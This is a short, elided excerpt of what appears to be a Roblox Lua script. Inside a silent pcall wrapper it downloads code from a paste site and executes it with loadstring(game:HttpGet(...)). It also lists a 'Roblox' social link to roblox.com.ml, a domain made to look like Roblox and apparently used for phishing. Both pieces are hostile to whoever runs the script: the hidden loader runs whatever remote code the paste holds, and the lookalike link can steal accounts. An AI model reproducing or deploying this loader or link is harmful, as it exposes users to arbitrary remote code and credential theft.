...
pcall(function()
    ...
    loadstring(game:HttpGet("https://paste.debian.net/plainh/a0e3c799/", true))()
end)
...
local socials = {
    ...
    {name="Roblox", color1=Color3.fromRGB(0,0,0), color2=Color3.fromRGB(80,80,80), link="https://www.roblox.com.ml/communities/6180687381/blade"},
}
